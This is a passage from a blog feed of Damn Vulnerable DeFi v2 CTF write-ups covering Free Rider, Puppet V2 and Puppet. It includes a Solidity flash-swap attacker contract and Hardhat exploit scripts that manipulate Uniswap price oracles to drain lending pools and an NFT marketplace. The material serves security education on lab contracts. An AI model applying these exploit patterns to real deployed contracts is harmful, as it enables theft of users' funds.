uint256,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(msg.sender == address(UNISWAP_PAIR) &amp;&amp; tx.origin == attacker);</span><br><span class="line"></span><br><span class="line">        // 2. Get ETH by depositing WETH</span><br><span class="line">        WETH.withdraw(_amount0);</span><br><span class="line"></span><br><span class="line">        // 3. Buy NFTs</span><br><span class="line">        (bool nftsBought, ) = marketplace.call&#123;value: _amount0&#125;(</span><br><span class="line">            abi.encodeWithSignature(&quot;buyMany(uint256[])&quot;, tokenIds)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 4. Calculate flash swap&#x27;s fee and total</span><br><span class="line">        uint256 _fee = (_amount0 * 3) / 997 + 1;</span><br><span class="line">        uint256 _repayAmount = _fee + _amount0;</span><br><span class="line"></span><br><span class="line">        // 5. Get WETH to pay back the flash swap</span><br><span class="line">        WETH.deposit&#123;value: _repayAmount&#125;();</span><br><span class="line"></span><br><span class="line">        // 6. Pay back the flash swap with fee included</span><br><span class="line">        WETH.transfer(address(UNISWAP_PAIR), _repayAmount);</span><br><span class="line"></span><br><span class="line">        // 7. Send NFT&#x27;s to buyer</span><br><span class="line">        for (uint256 i = 0; i &lt; 6; i++) &#123;</span><br><span class="line">            NFT.safeTransferFrom(address(this), buyer, tokenIds[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 8. Transfer ETH to attacker</span><br><span class="line">        (bool ethSent, ) = attacker.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(nftsBought &amp;&amp; ethSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to allow this contract to receive NFTs</span><br><span class="line">    function onERC721Received(</span><br><span class="line">        address,</span><br><span class="line">        address,</span><br><span class="line">        uint256,</span><br><span class="line">        bytes memory</span><br><span class="line">    ) external view returns (bytes4) &#123;</span><br><span class="line">        require(msg.sender == address(NFT) &amp;&amp; tx.origin == attacker);</span><br><span class="line">        return 0x150b7a02; //IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Our FreeRiderAttacker contract has a receive() function to make the contract able to receive the ETH of the payout and the ETH that we get when buying an NFT. It also has to implement the onERC721Received() function and return the corresponding selector to receive the NFTs of the marketplace.</p><p>Following the FreeRiderAttacker contract implementation, the attack goes like this:</p><p>1.We have an <code>attack()</code> function that executes a flash swap by calling UniswapV2Pair <code>swap()</code> function passing some arbitrary data (as explained in the documentation). This is done to get the 15 WETH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function attack(uint256 _amount0) external &#123;</span><br><span class="line">   require(msg.sender == attacker);        </span><br><span class="line">   bytes memory _data = &quot;1&quot;;         </span><br><span class="line">   // 1. Do a flash swap to get WETH        </span><br><span class="line">   UNISWAP_PAIR.swap(            </span><br><span class="line">      _amount0, // amount0 =&gt; WETH            </span><br><span class="line">      0, // amount1 =&gt; DVT            </span><br><span class="line">      address(this), // recipient of flash swap            </span><br><span class="line">      _data // passed to uniswapV2Call function</span><br><span class="line">   );    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.After the <code>attack()</code> function is called, the UniswapV2Pair contract will call the <code>uniswapV2Call()</code> function of our attacker contract. So, inside that function we continue our attack. We deposit the WETH we just got from the flash swap to the WETH contract to get its equivalent in ETH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WETH.withdraw(_amount0);</span><br></pre></td></tr></table></figure><p>3.Use that obtained ETH to buy the NFTs of the marketplace. We only need 15 ETH to get all 6 NFTs out of it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(bool nftsBought, ) = marketplace.call&#123;value: _amount0&#125;(</span><br><span class="line">  abi.encodeWithSignature(</span><br><span class="line">     &quot;buyMany(uint256[])&quot;,</span><br><span class="line">     tokenIds</span><br><span class="line">  )        </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>4.Calculate the flash swap’s fee and the total that we have to transfer back to the UniswapV2Pair contract.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 _fee = (_amount0 * 3) / 997 + 1;        </span><br><span class="line">uint256 _repayAmount = _fee + _amount0;</span><br></pre></td></tr></table></figure><p>5.Deposit the calculated _repayAmount of ETH to the WETH9 contract, to get the amount of WETH needed to pay back the flash swap to the UniswapV2Pair contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WETH.deposit&#123;value: _repayAmount&#125;();</span><br></pre></td></tr></table></figure><p>6.Transfer the WETH borrowed from flash swap back to UniswapV2Pair with fee included (so that the transaction won’t revert):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WETH.transfer(address(UNISWAP_PAIR), _repayAmount);</span><br></pre></td></tr></table></figure><p>7.Transfer the NFTs to the buyer contract, so that we get our payout of 45 ETH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; 6; i++) &#123; </span><br><span class="line">   NFT.safeTransferFrom(address(this), buyer, tokenIds[i]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8.Finally, withdraw all ETH from our FreeRiderAttacker contract to our attacker address:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(bool ethSent, ) = attacker.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>And that’s it. In the JS file, we would only need to deploy the contract with the correct parameters for the constructor and call the attack() function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Deploy evil contract</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">attackerContract</span> = <span class="keyword">await</span> (</span><br><span class="line"><span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;FreeRiderAttacker&#x27;</span>, attacker)</span><br><span class="line">).<span class="title function_">deploy</span>(</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">nft</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">uniswapPair</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">marketplace</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">buyerContract</span>.<span class="property">address</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attack</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">attackerContract</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">NFT_PRICE</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attacker balance = 120 ETH</span></span><br><span class="line"><span class="comment">// NFT transfers = (6 NFTs * 15 ETH ) - 15 WETH of flash swap = 75 ETH</span></span><br><span class="line"><span class="comment">// 45 ETH (Payout) + 75 ETH (NFT transfers) = 120 ETH</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Attacker ETH balance:&#x27;</span>, <span class="title class_">String</span>(<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(attacker.<span class="property">address</span>)))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>After that, we’ve done what we wanted. The buyer has the 6 NFTs he wanted, we got 120 ETH on our hands (starting with 0.5) and the marketplace is left with nothing.</p>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.Puppet V2</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/09.Puppet%20V2/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/09.Puppet%20V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Puppet-V2"><a href="#Puppet-V2" class="headerlink" title="Puppet V2"></a>Puppet V2</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><h3 id="the-whole-analyse"><a href="#the-whole-analyse" class="headerlink" title="the whole analyse"></a>the whole analyse</h3><p>This challenge requires to be familiar with (at least) the following UniswapV2 smart contracts:</p><ul><li><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol">UniswapV2</a></li><li><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol">UniswapV2Router02</a></li><li><a href="https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol">UniswapV2Pair</a></li></ul><p>In this challenge, there’s a pair contract (liquidity pool) between WETH and DVT from where PuppetV2 gets the price of the DVT tokens when some user wants to borrow(), calculating the deposit of WETH required by calling UniswapV2Library (line 89):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;</span><br><span class="line">  (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library</span><br><span class="line">     .getReserves(_uniswapFactory, address(_weth), address(_token));</span><br><span class="line">  return UniswapV2Library.quote(</span><br><span class="line">    amount.mul(10**18),</span><br><span class="line">    reservesToken,</span><br><span class="line">    reservesWETH</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The math behind the UniswapV2 liquidity pool contract for calculating the cost of an asset can be found on the quote() function of the UniswapV2Library contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;       </span><br><span class="line">  require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;);</span><br><span class="line">  require(</span><br><span class="line">    reserveA &gt; 0 &amp;&amp; reserveB &gt; 0,</span><br><span class="line">    &#x27;UniswapV2Library:INSUFFICIENT_LIQUIDITY&#x27;</span><br><span class="line">  ); </span><br><span class="line">  amountB = amountA.mul(reserveB) / reserveA;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now, since the attacker has a big amount of DVT tokens, he’s able to manipulate the price of the DVT by swapping them all with WETH on the Uniswap exchange of the pair DVT/WETH. To devaluate its price, the attacker has to increase the amount of DVT and decrease the amount of WETH in the pool. So, similar to previous level Puppet, the vulnerability of this challenge lies upon the ability of a singular entity to change an asset’s price drastically.</p><ul><li>it uses Uniswap v2 as a price oracle</li><li>the assets in the liquidity pool are WETH / DVT</li><li>initial：the asset ratio is 10 / 100</li></ul><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>1.Swap all of the attacker DVT tokens with WETH in the Uniswap exchange (pair) contract：Approve all attacker’s DVT balance to UniswapRouter contract, and Swap all DVT tokens with WETH using the UniswapRouter contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line"><span class="comment">// 在交易所置换自己所有的token</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">swapExactTokensForETH</span>(</span><br><span class="line">    <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    [<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">WETH</span>()],</span><br><span class="line">    attacker.<span class="property">address</span>,</span><br><span class="line">    <span class="number">9999999999</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>2.Get the extra WETH needed to borrow by depositing some ETH to the WETH contract</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> amount = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositOfWETHRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">deposit</span>(&#123;<span class="attr">value</span>:amount&#125;);</span><br></pre></td></tr></table></figure><p>3.Finally, borrow all the tokens. And we should call the approve() to make sure borrow() can be excuted.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="property">address</span>, amount);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br></pre></td></tr></table></figure><h2 id="solutions"><a href="#solutions" class="headerlink" title="solutions"></a>solutions</h2><ul><li>solution 1</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">            <span class="string">&#x27;WETH REQUIRED BEFORE SWAP: &#x27;</span>,</span><br><span class="line">            <span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositOfWETHRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>))</span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Approve all attacker&#x27;s DVT balance to UniswapRouter contract.</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span></span><br><span class="line">            .<span class="title function_">connect</span>(attacker)</span><br><span class="line">            .<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Swap all DVT tokens with WETH using the UniswapRouter contract.</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">swapExactTokensForTokens</span>(</span><br><span class="line">            <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>, <span class="comment">// amountIn</span></span><br><span class="line">            <span class="number">0</span>, <span class="comment">// amountOutMin</span></span><br><span class="line">            [<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="property">address</span>], <span class="comment">// [tokenFromUserToPool, tokenFromPoolToUser]</span></span><br><span class="line">            attacker.<span class="property">address</span>, <span class="comment">// to</span></span><br><span class="line">            (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(<span class="string">&#x27;latest&#x27;</span>)).<span class="property">timestamp</span> * <span class="number">2</span> <span class="comment">// arbitrary deadline</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Get the extra WETH needed by interacting with WETH9 contract</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">deposit</span>(&#123;<span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;19.6&#x27;</span>)&#125;)</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Borrow all DVT tokens from pool (~29.5 WETH)</span></span><br><span class="line">        <span class="keyword">const</span> wethRequired = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositOfWETHRequired</span>(</span><br><span class="line">            <span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="property">address</span>, wethRequired)</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WETH REQUIRED AFTER SWAP: &#x27;</span>, <span class="title class_">String</span>(wethRequired))</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><ul><li>solution 2</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">   <span class="comment">// 在交易所置换自己所有的token</span></span><br><span class="line">   <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">swapExactTokensForETH</span>(</span><br><span class="line">       <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>,</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       [<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>, <span class="variable language_">this</span>.<span class="property">uniswapRouter</span>.<span class="title function_">WETH</span>()],</span><br><span class="line">       attacker.<span class="property">address</span>,</span><br><span class="line">       <span class="number">9999999999</span></span><br><span class="line">   );</span><br><span class="line">   </span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Attacker`s balance:&#x27;</span>, (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(attacker.<span class="property">address</span>)).<span class="title function_">toString</span>());</span><br><span class="line">   <span class="comment">//计算borrow所有token所需要的eth</span></span><br><span class="line">   <span class="keyword">const</span> amount = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositOfWETHRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">   <span class="comment">//先往钱包里存钱</span></span><br><span class="line">   <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">deposit</span>(&#123;<span class="attr">value</span>:amount&#125;);</span><br><span class="line">   <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">weth</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="property">address</span>, amount);</span><br><span class="line">   <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.Puppet</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/08.Puppet/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/08.Puppet/</url>
      
        <content type="html"><![CDATA[<h1 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>the whole business</p><p><img src="https://moe.photo/images/2023/02/25/puppet_correct.png" alt></p><p>borrow(): you can borrow DVT from the lendingPool, but you should Mortgage twice the depositRequired while the depositRequired depends on the proportion of uniswapPair.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH</span><br><span class="line">function borrow(uint256 borrowAmount) public payable nonReentrant &#123;</span><br><span class="line">    uint256 depositRequired = calculateDepositRequired(borrowAmount);</span><br><span class="line">    </span><br><span class="line">    require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);</span><br><span class="line">    </span><br><span class="line">    if (msg.value &gt; depositRequired) &#123;</span><br><span class="line">        payable(msg.sender).sendValue(msg.value - depositRequired);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    deposits[msg.sender] = deposits[msg.sender] + depositRequired;</span><br><span class="line"></span><br><span class="line">    // Fails if the pool doesn&#x27;t have enough tokens in liquidity</span><br><span class="line">    require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    emit Borrowed(msg.sender, depositRequired, borrowAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>My understanding is that we gave PuppetPool 10000 DVT at the beginning, and then went to the exchange to addLiquidity [10ETH : 10DVT]. lendingPool lends DVT according to the liquidity ratio of the exchange .<br>But when the PuppetPool is lent, it needs to charge twice the deposit[depositRequired]. At the beginning, the liquidity ratio is 1:1, and we will make the ratio unbalanced. For example 0.1ETH to exchange for 1000DVT, and then the depositRequired will become very small. The 25ETH of attacker is enough to exchange for twice the depositRequired of 10000DVT. </p><p>Such a shallow pool can be easily manipulated. We can manipulate the proportion of uniswap.</p><p>The solution is the following:</p><ol><li>Exchange the attackers 1000 DVT token to ~ 9.9 ETH using the v1 pool (We can’t buy all the ETH from the pool).</li><li>This will cause that 1 DVT = 0.1 / 1010 (0,00009901 ETH)</li><li>To borrow the 100000 DVT we will need ~19.95 ETH</li><li>Borrow all DVT tokens available from the <code>PuppetPool</code> .</li></ol><p>the uniswap v1 we should learn, this is the github <a href="https://github.com/PhABC/uniswap-solidity/blob/master/contracts/uniswap/UniswapExchange.sol">link</a>.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>tokenToEthSwapInput and tokenToEthSwapOutput: one of them is counting the ETH which u will get base on how much token u provide, the other is to calculate the token required to obtain a specific number of ETHs</p><ul><li>solution 1</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">tokenToEthSwapInput</span>(</span><br><span class="line">        <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>.<span class="title function_">sub</span>(<span class="number">1</span>),</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">9999999999</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 先计算borrow所有的token需要多少的eth</span></span><br><span class="line">    <span class="keyword">const</span> amount = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>, &#123;<span class="attr">value</span>:amount&#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>solution 2</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// approve all tokens from attacker to 